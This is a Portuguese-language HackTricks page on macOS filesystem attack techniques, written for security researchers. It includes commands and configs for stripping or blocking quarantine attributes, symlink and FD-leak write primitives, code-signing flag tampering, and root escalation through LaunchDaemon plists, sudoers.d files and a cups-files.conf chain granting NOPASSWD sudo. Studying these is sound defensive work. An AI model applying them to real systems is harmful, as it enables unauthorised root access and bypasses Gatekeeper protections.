# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Combinações de permissões POSIX

Para um **diretório**, os três bits de permissão significam algo diferente do que significam em um arquivo comum. `chmod(1)` chama o bit de execução de "**search**" quando ele é aplicado a um diretório:<sup>[2]</sup>

> `0100` Para arquivos, permite a execução pelo proprietário. Para diretórios, permite ao proprietário **search** no diretório.

- **read** - você pode **enumerate** as entradas do diretório (listar os nomes).
- **write** - você pode **create, rename and delete entries** no diretório. Observe que isso é uma propriedade do diretório *containing*, não do arquivo: você pode deletar um arquivo que não pode ler ou escrever, desde que possa escrever no diretório pai.
- Para deletar um **subdirectory**, ele deve estar vazio, o que, por sua vez, requer direitos suficientes para remover tudo que está dentro dele.
- Se o diretório tiver o **sticky bit** (`S_ISVTX`, como `/tmp`), isso será restrito — o POSIX afirma que um processo só poderá remover ou renomear arquivos nele se for proprietário do arquivo, proprietário do diretório ou tiver os privilégios apropriados.<sup>[1]</sup>
- **execute / search** - você tem permissão para **traverse** o diretório. A resolução do pathname localiza cada componente "no diretório especificado por seu predecessor", portanto **perder direitos de search em qualquer componente individual do prefixo do path torna tudo abaixo dele inacessível por path**, mesmo que o arquivo leaf seja legível por todos.<sup>[1]</sup>

### Combinações perigosas

**Como sobrescrever um arquivo/pasta pertencente a root**, mas:

- Um **directory owner** pai no path é o usuário
- Um **directory owner** pai no path é um **users group** com **write access**
- Um **users group** tem **write access** ao **file**

Com qualquer uma das combinações anteriores, um atacante poderia **inject** um **sym/hard link** no path esperado para obter um arbitrary write privilegiado.

### Caso especial de Folder root R+X

Isso resulta diretamente da regra de resolução de pathname acima. Se um **directory only grants R+X to root**, os arquivos dentro dele ficam inacessíveis *por path* para todos os outros — mas os próprios permission bits dos **files** ainda podem ser permissivos. O diretório é o único obstáculo.

Assim, qualquer primitive que permita retirar o arquivo **out of that directory** — um processo privilegiado que **moves/renames/copies** um path escolhido pelo atacante para um local que você consiga atravessar — transforma isso em um arbitrary read, sem nunca precisar derrotar o próprio mode do arquivo:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Procure por mecanismos privilegiados de movimentação de arquivos (instaladores, rotacionadores de logs, coletores de falhas/diagnósticos, recursos de backup e de "exportação") que aceitem um caminho de origem de um usuário com privilégios inferiores.

## Link simbólico / Hard link

### Arquivo/pasta permissivo

Se um processo privilegiado estiver gravando dados em um **arquivo** que possa ser **controlado** por um **usuário com privilégios inferiores**, ou que possa ter sido **criado anteriormente** por um usuário com privilégios inferiores. O usuário poderia simplesmente **apontá-lo para outro arquivo** por meio de um link simbólico ou Hard link, e o processo privilegiado gravaria nesse arquivo.

Verifique as outras seções para identificar onde um invasor poderia **abusar de uma gravação arbitrária para escalar privilégios**.

### Abrir `O_NOFOLLOW`

De acordo com [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Se `O_NOFOLLOW` for usado na máscara e o arquivo de destino passado para `open()` for um link simbólico, então `open()` falhará."* Somente o componente **final** é verificado — todos os componentes **intermediários** ainda são resolvidos e seguidos. Portanto, um desenvolvedor que "protegeu" uma gravação com `O_NOFOLLOW` ainda pode ser atacado por meio da criação de um link simbólico em qualquer **diretório pai** do caminho de destino.<sup>[3]</sup>

A mesma página de manual documenta as flags que realmente eliminam essa brecha:<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *"se ... qualquer componente do caminho passado para `open()` for um link simbólico, então `open()` falhará."*
- **`O_RESOLVE_BENEATH`** — *"se ... a resolução do caminho especificado escapar do diretório associado ao fd, então `openat()` falhará."*

Caso contrário, `openat()` relativo a um FD de diretório que você já validou, ou `realpath()` + uma nova validação, são as formas restantes de impedir trocas de links simbólicos no caminho intermediário.

## .fileloc

Arquivos com a extensão **`.fileloc`** podem apontar para outros aplicativos ou binários; assim, quando são abertos, o aplicativo/binário será executado.\
Exemplo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Descritores de arquivo

### Leak FD (no `O_CLOEXEC`)

Se uma chamada a `open` não tiver a flag `O_CLOEXEC`, o descritor de arquivo será herdado pelo processo filho. Portanto, se um processo privilegiado abrir um arquivo privilegiado e executar um processo controlado pelo atacante, o atacante **herdará o FD referente ao arquivo privilegiado**.

O exemplo clássico é o **`DYLD_PRINT_TO_FILE` LPE no OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld` respeitava `DYLD_PRINT_TO_FILE=/path` até mesmo em **binários restritos (suid root)**, porque essa variável específica era analisada fora de `processDyldEnvironmentVariable()`.
- Ele executava `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, portanto **criava um arquivo pertencente ao root em um caminho arbitrário**.
- O FD **nunca era fechado e não tinha a flag close-on-exec**, portanto todo processo filho do binário suid herdava um **FD gravável para um arquivo pertencente ao root**.
- Executar, por exemplo, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` e depois ler o número do FD herdado no processo filho permitia gravações arbitrárias em arquivos pertencentes ao root; `fcntl(fd, F_SETFL, 0)` inclusive removia `O_APPEND`, permitindo sobrescrever em vez de adicionar ao final.

O mesmo padrão aparece sempre que um processo privilegiado abre um arquivo **antes** de executar algo que você controla (ferramentas auxiliares, editores no estilo `crontab` invocados por meio de `$EDITOR`, arquivos de log/debug abertos a partir de um caminho em uma variável de ambiente...). Enumere os FDs herdados com:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Qualquer coisa acima de `2` que aponte para um arquivo que você não consegue abrir por conta própria é uma primitiva de escrita arbitrária (ou leitura arbitrária).

## Evite técnicas com xattrs de quarantine

### Remova-a
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Se um arquivo/pasta tiver esse atributo immutable, não será possível adicionar um xattr a ele
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Sistemas de arquivos sem suporte a xattr

Nem todo sistema de arquivos que o macOS pode montar armazena **atributos estendidos** nativamente. HFS+ e APFS oferecem suporte; **FAT32, exFAT e a maioria dos mounts NFS não** — o macOS os emula gravando um arquivo auxiliar **AppleDouble** chamado `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

Isso é importante para quarantine, pois o xattr só persiste se puder ser realmente gravado **e lido novamente** a partir do mesmo volume:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Se o volume for lido posteriormente em um path que ignora o companion `._` (ou se o companion for removido/excluído), o arquivo chega **sem uma quarantine flag** — e um `.app` sem quarantine é suficiente para escapar do App Sandbox, conforme explicado em [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Esta ACL impede a adição de `xattrs` ao arquivo
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

O formato de arquivo **AppleDouble** copia um arquivo incluindo seus ACEs.

No [**código-fonte**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), é possível ver que a representação textual da ACL armazenada dentro do xattr chamado **`com.apple.acl.text`** será definida como a ACL do arquivo descompactado. Portanto, se você compactar um aplicativo em um arquivo zip usando o formato de arquivo **AppleDouble** com uma ACL que impeça a gravação de outros xattrs nele... o xattr de quarantine não será definido no aplicativo:

Consulte o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) para obter mais informações.<sup>[6]</sup>

Para reproduzir isso, primeiro precisamos obter a string correta da ACL:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Observe que, mesmo que isso funcione, o sandbox grava o xattr de quarantine antes)

Não é realmente necessário, mas deixo isso aqui por precaução:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass de verificações de assinatura

### Bypass de verificações de platform binaries

Algumas verificações de segurança verificam se o binário é um **platform binary**, por exemplo, para permitir a conexão a um XPC service. No entanto, como exposto em um bypass em https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, é possível contornar essa verificação obtendo um platform binary (como /bin/ls) e injetando o exploit por meio do dyld usando a variável de ambiente `DYLD_INSERT_LIBRARIES`.<sup>[7]</sup>

### Bypass das flags `CS_REQUIRE_LV` e `CS_FORCED_LV`

É possível que um binário em execução modifique as próprias flags para contornar verificações com um código como:<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Ignorar assinaturas de código

Os Bundles contêm o arquivo **`_CodeSignature/CodeResources`**, que contém o **hash** de cada **arquivo** no **bundle**. Observe que o hash de CodeResources também está **embedded no executable**, portanto também não podemos alterar isso.

No entanto, existem alguns arquivos cuja assinatura não será verificada; eles têm a chave omit no plist, como:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
É possível calcular a assinatura de um recurso pela CLI com:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montar dmgs

Um usuário pode montar um dmg personalizado criado até mesmo sobre algumas pastas existentes. É assim que você pode criar um pacote dmg personalizado com conteúdo personalizado:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Normalmente, o macOS monta discos comunicando-se com o serviço Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fornecido por `/usr/libexec/diskarbitrationd`). Se o parâmetro `-d` for adicionado ao arquivo plist do LaunchDaemons e o serviço for reiniciado, os logs serão armazenados em `/var/log/diskarbitrationd.log`.\
No entanto, é possível usar ferramentas como `hdik` e `hdiutil` para se comunicar diretamente com o kext `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Periodic sh scripts

Se o seu script puder ser interpretado como um **shell script**, você poderá sobrescrever o shell script **`/etc/periodic/daily/999.local`**, que será acionado todos os dias.

Você pode **simular** uma execução desse script com: **`sudo periodic daily`**

### Daemons

Escreva um **LaunchDaemon** arbitrário, como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, com um plist que execute um script arbitrário, como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Gere apenas o script `/Applications/Scripts/privesc.sh` com os **comandos** que você gostaria de executar como root.

### Arquivo sudoers

Se você tiver **arbitrary write**, poderá criar um arquivo dentro da pasta **`/etc/sudoers.d/`** concedendo privilégios de **sudo** a si mesmo.

### Arquivos PATH

O arquivo **`/etc/paths`** é um dos principais locais que preenchem a variável de ambiente PATH. Você precisa ser root para sobrescrevê-lo, mas, se um script de um **privileged process** estiver executando algum **comando sem o caminho completo**, talvez seja possível **hijack**-lo modificando esse arquivo.

Você também pode gravar arquivos em **`/etc/paths.d`** para carregar novas pastas na variável de ambiente `PATH`.

### cups-files.conf

Esta técnica foi usada neste [writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[8]</sup>

Crie o arquivo `/etc/cups/cups-files.conf` com o seguinte conteúdo:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Isso criará o arquivo `/etc/sudoers.d/lpe` com permissões 777. O lixo extra no final serve para acionar a criação do error log.

Em seguida, escreva em `/etc/sudoers.d/lpe` a configuração necessária para escalar privilégios, como `%staff ALL=(ALL) NOPASSWD:ALL`.

Depois, modifique novamente o arquivo `/etc/cups/cups-files.conf`, indicando `LogFilePerm 700`, para que o novo arquivo sudoers se torne válido ao invocar `cupsctl`.

### Escape do Sandbox

É possível escapar do sandbox do macOS com um FS arbitrary write. Para alguns exemplos, consulte a página [macOS Auto Start](../../../../macos-auto-start-locations.md), mas uma técnica comum é escrever um arquivo de preferências do Terminal em `~/Library/Preferences/com.apple.Terminal.plist` que execute um comando na inicialização e chamá-lo usando `open`.

## Gerar arquivos graváveis como outros usuários

Uma primitiva de privesc muito comum é fazer um **processo privilegiado criar um arquivo para você** em um diretório que você controla e, em seguida, manter **acesso de escrita** a esse arquivo. São necessários dois elementos:

1. Um diretório que pertença a você (ou no qual você possa definir uma **ACL herdável**), para que tudo o que for criado dentro dele herde suas permissões.
2. Um processo privilegiado/`suid` ao qual seja possível informar **onde** criar um arquivo — normalmente por meio de uma variável de ambiente de debug/logging, um arquivo de configuração ou a API XPC de um helper.

A parte da **ACL herdável** é o que torna o arquivo criado gravável por você, mesmo sendo propriedade de outro usuário. As flags de herança `file_inherit` / `directory_inherit` estão documentadas em [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Agora, qualquer arquivo que um processo privilegiado criar dentro de `$DIRNAME` será **gravável por você**. Se esse diretório também for um local que posteriormente é **executado como root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, um diretório de LaunchDaemon...), isso resulta em uma escalação direta para root. Consulte as seções [Sudoers File](#sudoers-file) e [cups-files.conf](#cups-filesconf) acima para saber o que escrever depois que você obtiver o arquivo.

Para ver um exemplo completo do encadeamento "uma variável de ambiente faz um processo root criar um arquivo, e o FD vaza para você", consulte [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) acima.

## Memória compartilhada POSIX

A **memória compartilhada POSIX** permite que processos em sistemas operacionais compatíveis com POSIX acessem uma área de memória comum, facilitando uma comunicação mais rápida em comparação com outros métodos de comunicação entre processos. Isso envolve criar ou abrir um objeto de memória compartilhada com `shm_open()`, definir seu tamanho com `ftruncate()` e mapeá-lo no espaço de endereçamento do processo usando `mmap()`. Os processos podem então ler e gravar diretamente nessa área de memória. Para gerenciar o acesso simultâneo e evitar corrupção de dados, mecanismos de sincronização, como mutexes ou semáforos, são frequentemente usados. Por fim, os processos desmapeiam e fecham a memória compartilhada com `munmap()` e `close()` e, opcionalmente, removem o objeto de memória com `shm_unlink()`. Esse sistema é especialmente eficaz para IPC eficiente e rápido em ambientes nos quais vários processos precisam acessar dados compartilhados rapidamente.

<details>

<summary>Exemplo de código do Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Exemplo de código do consumidor</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOS Guarded Descriptors** são um recurso de segurança introduzido no macOS para aumentar a segurança e a confiabilidade das **operações com descritores de arquivo** em aplicações de usuário. Esses descritores protegidos oferecem uma forma de associar restrições específicas, ou "guards", aos descritores de arquivo, que são aplicadas pelo kernel.

Esse recurso é particularmente útil para prevenir certas classes de vulnerabilidades de segurança, como **acesso não autorizado a arquivos** ou **race conditions**. Essas vulnerabilidades ocorrem, por exemplo, quando uma thread acessa uma descrição de arquivo, dando **a outra thread vulnerável acesso a ela**, ou quando um descritor de arquivo é **herdado** por um processo filho vulnerável. Algumas funções relacionadas a essa funcionalidade são:

- `guarded_open_np`: Abre um FD com um guard
- `guarded_close_np`: Fecha-o
- `change_fdguard_np`: Altera as flags do guard em um descritor (inclusive removendo a proteção do guard)

## Referências

- [1] [POSIX.1-2024 — Definições básicas, Cap. 4 (Permissões de acesso a arquivos, Proteção de diretórios, Resolução de nomes de caminho)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [Página de manual de `chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) (bit de pesquisa/execução de diretórios, flags de herança de ACL)
- [3] [Página de manual de `open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (FD vazado sem close-on-exec)
- [5] [The Eclectic Light Company - Quais sistemas de arquivos e serviços cloud preservam atributos estendidos?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - O calcanhar de Aquiles do Gatekeeper: descobrindo uma vulnerabilidade do macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Uma nova era dos escapes do macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Descobrindo vulnerabilidades da Apple: a história da auditoria do diskarbitrationd e storagekitd — Parte 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
